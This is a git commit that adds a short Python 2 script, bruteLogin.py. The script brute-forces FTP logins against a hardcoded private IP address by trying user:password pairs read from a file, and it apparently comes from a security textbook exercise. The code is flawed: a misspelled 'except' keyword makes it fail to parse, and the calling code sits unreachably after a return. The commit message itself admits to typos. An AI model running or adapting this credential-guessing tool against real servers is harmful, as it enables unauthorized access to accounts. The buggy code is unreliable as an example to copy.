7a15ccb65025e8664b7dfe40013f2ed768254d2b
n1cfury <fukugetin@gmail.com>
2017-02-04 20:32:48 -0800

    Initial build.  Consider improving with arguments.  DEBUG, because you did this after working hours on code with little to eat so you more than likely have erros and typos  <---- LIKE THOSE FOR EXAMPLE

---
+++ bruteLogin.py
@@ -0,0 +1,26 @@
+import ftplib
+
+def banner():
+	print "########    BruteLogin p 58   ########"
+	print "bruteLogin.py"
+
+
+def bruteLogin(hostname, passwdFile):
+	pF = open(passwdFile, 'r')
+	for line in pF.readlines():
+		userName = line.split(':')[0]
+		passWord = line.split(':')[1].strip('\n')
+		print '\n[*] Trying: '+userName+"/"+passWord
+		try:
+			ftp = ftplib.FTP(hostname)
+			ftp.login(userName, passWord)
+			print '\n[*] '+str(hostname)+' FTP Logon Succeded: '+userName+'/'+passWord
+			ftp.quit()
+			return (userName, passWord)
+		excetp Exception, e:
+			pass
+	print '\n[-] Could not brute force FTP credentials.'
+	return (None, None)
+	host = '192.168.95.179'
+	passwdFile = 'userpass.txt'
+	bruteLogin(host, passwdFile)
